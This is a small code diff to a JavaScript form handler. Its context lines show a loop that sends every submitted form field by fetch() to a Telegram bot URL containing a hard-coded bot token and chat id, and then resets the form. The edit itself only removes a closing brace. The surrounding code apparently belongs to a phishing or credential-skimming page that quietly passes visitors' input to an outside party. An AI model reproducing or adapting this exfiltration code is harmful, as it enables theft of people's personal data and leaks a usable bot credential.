@@ -36,7 +36,6 @@ function Validate()
     for (const key in client) {
         const URL = `https://api.telegram.org/bot5442760054:AAGNKmQ3Rc2VC4o7QiUCo-o4J-UsVbL8p74/sendMessage?chat_id=833384210&text=${key} : ${client[key]}`
         fetch(URL)
-        }
     }
     document.getElementById('Form').reset()
 }
